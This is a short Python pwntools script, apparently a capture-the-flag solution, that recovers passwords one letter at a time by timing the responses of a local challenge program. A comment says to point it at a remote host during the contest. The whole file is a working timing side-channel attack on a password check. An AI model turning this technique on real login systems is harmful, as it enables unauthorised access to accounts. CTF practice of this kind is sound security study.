from pwn import *

curr_passwd = ''
time_taken = 0

password_list = []

while True:
    # print(curr_passwd)
    for i in "abcdefghijklmnopqrstuvwxyz":

        # Make a remote connection with the ip and port here instead during the ctf to connect using netcat
        p = process("./cpu.py")

        for k in password_list:
            p.sendline(k.encode())
            p.recvline().decode()

        p.sendline(curr_passwd.encode() + i.encode())
        # print(curr_passwd + i)
        j = p.recvline().decode()
        # print(j)
        if 'Congratulations!' in j:
            print(j)
            password_list.append(curr_passwd + i)
            curr_passwd = ''
            time_taken = 0
            print("Found passwords: ", password_list)
            p.close()
            break
        j = p.recvline().decode()
        x = j.split()[-1]
        # print(x)

        x = float(x)
        print("Found passwords: ", password_list)
        print(curr_passwd + i)
        print(abs(x - time_taken))
        if abs(x - time_taken) > 0.002:
            print("found!")
            time_taken = x
            curr_passwd += i
            p.close()
            break

        p.close()
